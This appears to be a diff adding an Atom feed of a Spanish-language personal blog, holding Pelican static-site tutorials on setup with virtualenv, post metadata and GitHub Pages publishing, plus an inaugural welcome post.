+├── local/        &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── share/        &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+└── user.github.io/   &lt;span class="c1"&gt;# carpeta del repositorio del sitio&lt;/span&gt;
+    └── pelican/      &lt;span class="c1"&gt;# carpeta con los archivos fuente del sitio&lt;/span&gt;
+        ├── content   &lt;span class="c1"&gt;# Archivos en Markdown&lt;/span&gt;
+        │   └── hola-mundo.md &lt;span class="c1"&gt;# Entrada nueva&lt;/span&gt;
+        ├── output
+        ├── tasks.py
+        ├── Makefile
+        ├── pelicanconf.py
+        └── publishconf.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;En este caso hemos agregado el archivo &lt;code&gt;hola-mundo.md&lt;/code&gt;. Al ejecutar el comando
+para generar el sitio &lt;code&gt;Pelican&lt;/code&gt; tomara este archivo y lo procesara para darle
+la salida necesaria y general el&amp;nbsp;sitio.&lt;/p&gt;
+&lt;p&gt;Por lo tanto, para añadir más contenido a tu sitio basta con que lo agreguemos a
+esta&amp;nbsp;carpeta.&lt;/p&gt;
+&lt;h2&gt;¿Qué debe llevar una&amp;nbsp;entrada?&lt;/h2&gt;
+&lt;p&gt;Para una gestión adecuada del contenido en el sitio &lt;code&gt;Pelican&lt;/code&gt; necesita conocer
+algunas cosas sobre el contenido que estamos generando. Para esto es necesario
+incluir algunas etiquetas al inicio del archivo que serán consideradas como
+&lt;code&gt;metadatos&lt;/code&gt; por &lt;code&gt;Pelican&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A continuación una tabla con las etiquetas y para que&amp;nbsp;sirven:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Metadata&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;title&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Titulo del artículo o de la página&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;date&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Fecha de publicación (e.g., &lt;span class="caps"&gt;YYYY&lt;/span&gt;-&lt;span class="caps"&gt;MM&lt;/span&gt;-&lt;span class="caps"&gt;DD&lt;/span&gt; &lt;span class="caps"&gt;HH&lt;/span&gt;:&lt;span class="caps"&gt;SS&lt;/span&gt;)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;modified&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Fecha de modificación (e.g., &lt;span class="caps"&gt;YYYY&lt;/span&gt;-&lt;span class="caps"&gt;MM&lt;/span&gt;-&lt;span class="caps"&gt;DD&lt;/span&gt; &lt;span class="caps"&gt;HH&lt;/span&gt;:&lt;span class="caps"&gt;SS&lt;/span&gt;)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;tags&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Tags del contenido, separados por comas&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;keywords&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Palabras claves del contenido, separadas por comas&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;category&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Categoría del contenido, solo una&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;slug&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Identificador utilizado en URLs y en traducciones&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;author&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Autor (uno)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;authors&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Autores (más de uno)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;summary&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Pequeña descripción del contenido del artículo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;lang&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Idioma (en, fr, etc.)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;translation&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Indicamos si es un contenido traducido (true or false)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;status&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Estatus del contenido: borrador (draft), oculto (hidden), o publicado (published)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;template&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Nombre de la plantilla a utilizar para generar el contenido&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;save_as&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Guardar el archivo con respecto a su dirección relativa&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;url&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;span class="caps"&gt;URL&lt;/span&gt; a utilizar para el artículo o página&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Para el caso de este blog, estamos utilizando las siguientes&amp;nbsp;etiquetas:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;---
+Title: Este es el titulo
+Date: 2020-05-09
+Modified: 2020-05-09
+Tags: blog, pelican
+Keywords: blog, pelican
+Category: pelican
+Author: Penserbjorne
+Summary: Descripción del texto
+Lang: es-MX
+Translation: false
+Status: published
+---
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Estas etiquetas se encuentran al inicio de cada archivo y están contenidas entre
+dos lineas de tres guiones medios &lt;code&gt;---&lt;/code&gt; al inicio y al final, estas lineas no
+son&amp;nbsp;obligatorias.&lt;/p&gt;
+&lt;p&gt;En caso de no incluir estas etiquetas &lt;code&gt;Pelican&lt;/code&gt; no podrá procesar el archivo ni
+procederá a&amp;nbsp;convertirlo.&lt;/p&gt;
+&lt;h2&gt;Ahora sí, a&amp;nbsp;escribir&lt;/h2&gt;
+&lt;p&gt;Una vez que tenemos el archivo con su extensión &lt;code&gt;.md&lt;/code&gt; y que le añadimos las
+etiquetas necesarias podemos comenzar a escribir su contenido en &lt;code&gt;Markdown&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Para ver conocer otros detalles de como insertar imágenes o contenido estático
+en una entrada te recomendamos que revises la sección para
+&lt;a href="https://docs.getpelican.com/en/stable/content.html"&gt;escribir contenido&lt;/a&gt; de
+&lt;code&gt;Pelican&lt;/code&gt;, tal vez algún día escribamos una guía de redacción para &lt;code&gt;Pelican&lt;/code&gt;
+pero por ahora&amp;nbsp;no.&lt;/p&gt;
+&lt;p&gt;Una vez que la entrada ha sido redactada podemos proceder a procesar el sitio
+para que se generen los archivo de salida. Esto lo hacemos con los comandos que
+vimos en la &lt;a href="https://penserbjorne.com/pelican-01-creacion-de-un-blog-estatico-con-pelican-es-MX.html"&gt;entrada anterior&lt;/a&gt; (que te recomiendo
+leer para que no te pierdas en la estructura de archivos y de trabajo que
+utilizamos&amp;nbsp;aquí).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Generamos la salida HTML una carpeta arriba de donde estamos&lt;/span&gt;
+pelican content -o ..
+
+&lt;span class="c1"&gt;# Levantamos el sitio indicando la salida de los archivos HTML&lt;/span&gt;
+pelican --listen -o ..
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Para acceder al sitio en local visitamos
+&lt;a href="http://localhost:8000/"&gt;http://localhost:8000/&lt;/a&gt;, y listo, tendríamos que
+observar el sitio andando con nuestra entrada&amp;nbsp;nueva.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt Text" src="https://penserbjorne.com/images/02-pelican-02/screenshot-2021-04-04-hola-mundo.png"&gt;&lt;/p&gt;
+&lt;p&gt;Para poder estar trabajando con el sitio, es necesario cada vez que hagamos un
+cambio y modificación volver a generar los&amp;nbsp;archivos.&lt;/p&gt;
+&lt;h2&gt;Consideraciones de&amp;nbsp;trabajo&lt;/h2&gt;
+&lt;p&gt;Cada vez que regeneremos el sitio porque hemos realizado un cambio o hemos
+añadido contenido nuevo se van a generar los archivos &lt;code&gt;HTML&lt;/code&gt; correspondientes,
+si observamos cuidadosamente veremos que los archivos viejos no se&amp;nbsp;eliminan.&lt;/p&gt;
+&lt;p&gt;Vamos a suponer que le cambiamos el nombre a una categoría o a un texto, sus
+archivos correspondientes en la versión anterior seguirán ahí, por lo que hay
+que limpiar el entorno de&amp;nbsp;trabajo.&lt;/p&gt;
+&lt;p&gt;Por el momento una opción burda es eliminar todos los archivos y carpetas del
+directorio raíz del repositorio y dejar exclusivamente la carpeta &lt;code&gt;pelican&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Lo sé, lo sé, esto no es lo más viable o factible a largo plazo, ¡pero oye!
+apenas vamos comenzando, por lo cual lo solucionaremos más adelante, por ahora
+solo no te asustes si ves contenido duplicado, eliminalo y&amp;nbsp;ya.&lt;/p&gt;
+&lt;h2&gt;Siguientes&amp;nbsp;pasos&lt;/h2&gt;
+&lt;p&gt;Ya tenemos nuestro primer &lt;code&gt;hola mundo&lt;/code&gt; en el blog, basta con hacer push al repo
+para poder verlo andando en nuestra &lt;code&gt;GitHub Pages&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Esto es solo el comienzo, aún necesitamos seguir puliendo algunas cosas del
+sitio, ¿qué cosas?, para empezar, reemplazar el contenido que viene por default
+(esos enlaces en el &lt;code&gt;header&lt;/code&gt; o en el &lt;code&gt;footer&lt;/code&gt;), agregar algunas páginas y
+secciones como un &lt;code&gt;about&lt;/code&gt;, configurar algunas cositas para que el contenido se
+organice por año, que los archivos que se tengan que eliminar se eliminen para
+que no haya contenido extraño, etc,&amp;nbsp;etc.&lt;/p&gt;
+&lt;p&gt;Cómo podemos ver aún hay otros detallitos que iremos revisando pero por ahora ya
+podemos tener el sitio andando y con algo de contenido, así que vamos a seguir
+con otras cosas y nos leemos&amp;nbsp;pronto.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=NRI_8PUXx2A"&gt;See you in space cowboy&amp;nbsp;&amp;#8230;&lt;/a&gt;&lt;/p&gt;</content><category term="pelican"></category><category term="blog"></category><category term="pelican"></category></entry><entry><title>Pelican (01), creación de un blog estático con Pelican</title><link href="https://penserbjorne.com/pelican-01-creacion-de-un-blog-estatico-con-pelican-es-MX.html" rel="alternate"></link><published>2020-04-24T00:00:00-05:00</published><updated>2021-04-04T00:00:00-06:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-04-24:/pelican-01-creacion-de-un-blog-estatico-con-pelican-es-MX.html</id><summary type="html">&lt;p&gt;Creación de un blog estático con&amp;nbsp;Pelican&lt;/p&gt;</summary><content type="html">&lt;h2&gt;What is&amp;nbsp;this?&lt;/h2&gt;
+&lt;p&gt;Bueno, como primera entrada de notas, lo más lógico (para mi) es comenzar con la
+herramienta que esta haciendo posible esto, &lt;code&gt;Pelican&lt;/code&gt;. Esto ira siendo una serie
+de entradas sobre como trabajar con &lt;code&gt;Pelican&lt;/code&gt;, por ahora nos enfocaremos en
+crear el&amp;nbsp;sitio.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://blog.getpelican.com/"&gt;Pelican&lt;/a&gt; es una herramienta para generar sitios
+estáticos que no requieren una base de datos o una lógica en el lado del&amp;nbsp;servidor.&lt;/p&gt;
+&lt;p&gt;Básicamente, elegí &lt;code&gt;Pelican&lt;/code&gt; por &lt;em&gt;simplicidad&lt;/em&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Instalamos las herramientas necesarias de &lt;code&gt;Pelican&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Escribimos en &lt;code&gt;Markdown&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Generamos los archivos del&amp;nbsp;sitio.&lt;/li&gt;
+&lt;li&gt;Publicamos el sitio en el&amp;nbsp;servidor.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Estos pasos son &lt;em&gt;sencillos&lt;/em&gt; si estas acostumbradx a manejar herramientas
+en un terminal (la famosa ventanita negra), el cual, es mi&amp;nbsp;caso.&lt;/p&gt;
+&lt;p&gt;So, en esta &lt;strike&gt;entrada&lt;/strike&gt; serie de entradas iré añadiendo las cosas
+que considero necesito tener a la mano para administrar el blog. Toda la
+documentación necesaria (y extendida) se encuentra en
+&lt;a href="https://docs.getpelican.com"&gt;el blog oficial de Pelican&lt;/a&gt;, por lo
+que si se necesita mayor información o detalle de algo, visitar el sitio&amp;nbsp;oficial.&lt;/p&gt;
+&lt;p&gt;En este momento me encuentro trabajando en un equipo con
+&lt;strike&gt;&lt;code&gt;Lubuntu 18.04&lt;/code&gt;&lt;/strike&gt; &lt;code&gt;Pop_OS!&lt;/code&gt; por lo cual las instrucciones de
+instalación serán para esta&amp;nbsp;distribución.&lt;/p&gt;
+&lt;h2&gt;Preparación del&amp;nbsp;entorno&lt;/h2&gt;
+&lt;p&gt;Dado que &lt;code&gt;Pelican&lt;/code&gt; es una herramienta desarrollada con &lt;code&gt;Python&lt;/code&gt; y lo mejor es
+buscar tener un entorno limpio, estaremos trabajando con &lt;code&gt;virtualenv&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Instalación del entorno&lt;/span&gt;
+sudo apt install virtualenv
+
+&lt;span class="c1"&gt;# Creación del entorno&lt;/span&gt;
+virtualenv --python&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/python3 ~/path/to/virtual/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Para comenzar a trabajar es necesario movernos a la carpeta donde se configuró
+el entorno y&amp;nbsp;activarlo.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Nos movemos a la carpeta creada&lt;/span&gt;
+&lt;span class="nb"&gt;cd&lt;/span&gt; ~/path/to/virtual/env
+
+&lt;span class="c1"&gt;# Activamos el entorno&lt;/span&gt;
+&lt;span class="nb"&gt;source&lt;/span&gt; ./bin/activate
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Sabremos que el entorno se ha activado por que la terminal cambiará su apariencia
+a algo como lo&amp;nbsp;siguiente.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;(&lt;/span&gt;entorno_virtual&lt;span class="o"&gt;)&lt;/span&gt; usuario@equipo:~/path/to/virtual/env$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;A partir de aquí podemos comenzar a trabajar con &lt;code&gt;Pelican&lt;/code&gt; en un entorno aislado
+que no vaya a modificar nuestro sistema&amp;nbsp;operativo.&lt;/p&gt;
+&lt;p&gt;Una vez que hayamos terminado de trabajar en el sitio, podemos desactivar el&amp;nbsp;entorno.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Para desactivar virtualenv&lt;/span&gt;
+deactivate
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Instalación de las&amp;nbsp;herramientas&lt;/h2&gt;
+&lt;p&gt;En este caso vamos a redactar el sitio en &lt;code&gt;Markdown&lt;/code&gt;, por lo cual instalaremos
+lo necesario para que &lt;code&gt;Pelican&lt;/code&gt; funcione con &lt;code&gt;Markdown&lt;/code&gt;. Esto lo haremos a
+través de &lt;code&gt;pip&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Necesitaremos los paquetes de &lt;code&gt;pelican&lt;/code&gt;, &lt;code&gt;Markdown&lt;/code&gt; y &lt;code&gt;typogrify&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pip install pelican Markdown typogrify
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;En caso de necesitar actualizar alguna de estas herramientas, se puede hacer
+también a través de &lt;code&gt;pip&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pip install --upgrade pelican Markdown typogrify
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Creación del esqueleto del&amp;nbsp;sitio&lt;/h2&gt;
+&lt;p&gt;Para crear un proyecto con la estructura básica de &lt;code&gt;Pelican&lt;/code&gt; basta con ejecutar
+el siguiente comando (aún no lo hagas, necesito aclarar algo&amp;nbsp;antes).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pelican-quickstart
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;El comando creara una carpeta con la siguiente&amp;nbsp;estructura:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;yourproject/
+├── content
+│   └── &lt;span class="o"&gt;(&lt;/span&gt;pages&lt;span class="o"&gt;)&lt;/span&gt;
+├── output
+├── tasks.py
+├── Makefile
+├── pelicanconf.py
+└── publishconf.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Como podemos ver, es una estructura bien definida para el sitio. Esta estructura
+es la que se encontrará alojada en el repositorio del sitio. Hay que tener en
+cuenta que actualmente estamos en la carpeta de &lt;code&gt;virtualenv&lt;/code&gt;, así que aquí es
+donde vamos a clonar el repositorio, de tal modo que la carpeta actual tendría
+que verse así (asumiendo que ya clonamos el repositorio dentro de la carpeta de
+  virtualenv&amp;nbsp;¬¬):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;(&lt;/span&gt;entorno_virtual&lt;span class="o"&gt;)&lt;/span&gt; usuario@equipo:~/path/to/virtual/env$ ls
+bin  include  lib  &lt;span class="nb"&gt;local&lt;/span&gt;  user.github.io  share
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Como podemos observar, están las carpetas de &lt;code&gt;virtualenv&lt;/code&gt; y el repositorio del
+sitio, que en todo caso, si no es un repositorio, valdría la pena crear una
+carpeta (por ejemplo blog),  para que esta no se mezcle con lo de &lt;code&gt;virtualenv&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Básicamente estamos separando &lt;code&gt;virtualenv&lt;/code&gt; y el repositorio en carpetas
+distintas, para evitar que nuestro entorno virtual se vaya al&amp;nbsp;repositorio.&lt;/p&gt;
+&lt;p&gt;Dentro de la carpeta del repositorio será necesario crear una subcarpeta más. En
+esta carpeta que llamaremos &lt;code&gt;pelican&lt;/code&gt; es donde se encontrara los archivos fuente
+del sitio que son con los que trabaja &lt;code&gt;Pelican&lt;/code&gt;, y dentro de esta subcarpeta es
+donde ejecutaremos el comando para la creación del proyecto (ya sé, ya sé,
+  tanta carpeta marea, pero hay una razón para hacerlo así, por ahora confiá
+  en&amp;nbsp;mi).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;(&lt;/span&gt;entorno_virtual&lt;span class="o"&gt;)&lt;/span&gt; usuario@equipo:~/path/to/virtual/env/user.github.io/pelican$ pelican-quickstart
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;De tal modo que la estructura de archivos debería de verse de la siguiente&amp;nbsp;manera.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/path/to/project
+├── bin/          &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── include/      &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── lib/          &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── local/        &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── share/        &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+└── user.github.io/   &lt;span class="c1"&gt;# carpeta del repositorio del sitio&lt;/span&gt;
+    └── pelican/      &lt;span class="c1"&gt;# carpeta con los archivos fuente del sitio&lt;/span&gt;
+        ├── content   &lt;span class="c1"&gt;# Archivos en Markdown&lt;/span&gt;
+        │   └── &lt;span class="o"&gt;(&lt;/span&gt;pages&lt;span class="o"&gt;)&lt;/span&gt;
+        ├── output
+        ├── tasks.py
+        ├── Makefile
+        ├── pelicanconf.py
+        └── publishconf.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Generar y ejecutar el&amp;nbsp;sitio&lt;/h2&gt;
+&lt;p&gt;Para generar el contenido del sitio vamos a posicionarnos en la carpeta del
+repositorio (o la que hemos llamado&amp;nbsp;blog).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Pelican&lt;/code&gt; cuenta con el comando &lt;code&gt;pelican content&lt;/code&gt;, el cual revisa los archivos
+necesarios para generar la salida de &lt;code&gt;HTML&lt;/code&gt;. La salida se almacena en automático
+en una carpeta llama &lt;code&gt;output&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;En nuestro caso como estamos utilizando &lt;code&gt;GihHub Pages&lt;/code&gt; tenemos la restricción de
+que el contenido sel sitio tiene que encontrarse en la raíz del repositorio en
+la rama &lt;code&gt;master&lt;/code&gt;, por lo cual tenemos que indicar que la salida sea en la raíz
+del repositorio (ves! así tenemos la salida del sitio en la raíz del
+  repositorio y los archivos fuente en la subcarpeta &lt;code&gt;pelican&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;Para lo anterior (y estando en la subcarpeta &lt;code&gt;pelican&lt;/code&gt;)&amp;nbsp;ejecutamos:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Generamos la salida HTML una carpeta arriba de donde estamos&lt;/span&gt;
+pelican content -o ..
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Esto generara los archivos &lt;code&gt;HTML&lt;/code&gt; del sitio en la raíz del&amp;nbsp;repositorio.&lt;/p&gt;
+&lt;p&gt;Para visualizar el sitio contamos con el comando &lt;code&gt;pelican --listen&lt;/code&gt; el cual
+levanta un servidor en el puerto 8080. En nuestro caso (y sin salir de la
+  subcarpeta) tendremos que indicar donde estan los archivos generados, por lo
+  cual vamos a ejecutar el siguiente&amp;nbsp;comando:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Levantamos el sitio indicando la salida de los archivos HTML&lt;/span&gt;
+pelican --listen -o ..
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Para acceder al sitio visitamos &lt;a href="http://localhost:8000/"&gt;http://localhost:8000/&lt;/a&gt;
+, y listo, tendríamos que observar el sitio&amp;nbsp;andando.&lt;/p&gt;
+&lt;p&gt;Para poder estar trabajando con el sitio, es necesario cada vez que hagamos un
+cambio o modificación volver a generar los&amp;nbsp;archivos.&lt;/p&gt;
+&lt;h2&gt;Creación de&amp;nbsp;contenido&lt;/h2&gt;
+&lt;p&gt;Recordando la estructura del sitio, sabemos que las entradas del mismo
+van en la carpeta &lt;code&gt;content&lt;/code&gt; de nuestra subcarpeta &lt;code&gt;pelican&lt;/code&gt;. Ahí es donde
+podremos comenzar a crear nuestros archivos en &lt;code&gt;Markdown&lt;/code&gt;. Esto lo dejaremos
+para la &lt;a href="https://penserbjorne.com/pelican-02-creacion-de-entradas-para-un-blog-estatico-con-pelican-es-MX.html"&gt;siguiente entrada&lt;/a&gt;, es momento de pararse
+por un poco de agua, algo de comer y a estirar la espalda y las&amp;nbsp;piernas.&lt;/p&gt;</content><category term="pelican"></category><category term="init"></category><category term="blog"></category><category term="pelican"></category></entry><entry><title>Hola Mundo</title><link href="https://penserbjorne.com/hola-mundo-es-MX.html" rel="alternate"></link><published>2020-04-11T00:00:00-05:00</published><updated>2021-04-03T00:00:00-06:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-04-11:/hola-mundo-es-MX.html</id><summary type="html">&lt;p&gt;Inauguración del blog de&amp;nbsp;Penserbjorne&lt;/p&gt;</summary><content type="html">&lt;p&gt;Bienvenido al &lt;a href="https://penserbjorne.com"&gt;Blog de Penserbjorne&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Desde hace tiempo (ya bastantes años, que horror) tenia ganas de &lt;strong&gt;escribir&lt;/strong&gt; en
+algún lugar que fuera &lt;strong&gt;personal&lt;/strong&gt;, ¿sobre qué?, no lo sé, de lo que se me dé la&amp;nbsp;gana.&lt;/p&gt;
+&lt;p&gt;Dicho lo anterior y ante lo evidente de que no sé realmente qué carajos
+escribiré aquí, puedo tratar de poner un poco de orden enumerando algunos temas
+de los que me gustaría escribir&amp;nbsp;aquí:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Hacking&lt;/strong&gt;, en su sentido real
+&lt;a href="https://en.wikipedia.org/wiki/Hacker_ethic"&gt;[1]&lt;/a&gt;,
+&lt;a href="https://en.wikipedia.org/wiki/Hacks_at_the_Massachusetts_Institute_of_Technology#Terminology"&gt;[2]&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Matemáticas&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Ingeniería&lt;/strong&gt;, no limitado a, pero, principalmente de temas de &lt;strong&gt;computación&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Tecnologías Libres y de Código&amp;nbsp;Abierto&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Ciberseguridad&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Hobbies&lt;/strong&gt;, porque hay que dejar libertad a escribir de lo que sea&amp;nbsp;:).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;De estos temas, probablemente la mayoría este escrita a modo de
+&lt;strong&gt;tutoriales/resúmenes&lt;/strong&gt; que en principio me ayuden a mi cómo
+&lt;strong&gt;guías de consulta rápida&lt;/strong&gt; en mi día a día, y si me animo, en algún caso,
+&lt;strong&gt;alguna opinión o comentario personal sobre algún tema&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;No esperen una redacción pulcra e impecable, claramente no soy un experto en
+temas de redacción y narrativas, solo busco plasmar cosas que considere útiles e
+interesantes, &lt;strong&gt;perdonen los horrores de redacción que puedan llegar a
+encontrar&lt;/strong&gt;&amp;nbsp;:P&lt;/p&gt;
+&lt;p&gt;Por ahora el sitio esta alojado en GitHub Pages
+&lt;strike&gt; con un dominio de GitHub, pero espero en algún momento no tener flojera
+y comprar un dominio &lt;/strike&gt; y su propio dominio feliz&amp;nbsp;:D&lt;/p&gt;
+&lt;p&gt;So, &lt;strong&gt;demos por inaugurado el
+&lt;a href="https://penserbjorne.com"&gt;blog de Penserbjorne&lt;/a&gt;, que la fuerza les
+acompañe&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;#HappyHacking&amp;nbsp;#FeedTheFox&lt;/strong&gt;&lt;/p&gt;</content><category term="blog"></category><category term="init"></category><category term="blog"></category><category term="penserbjorne"></category></entry></feed>
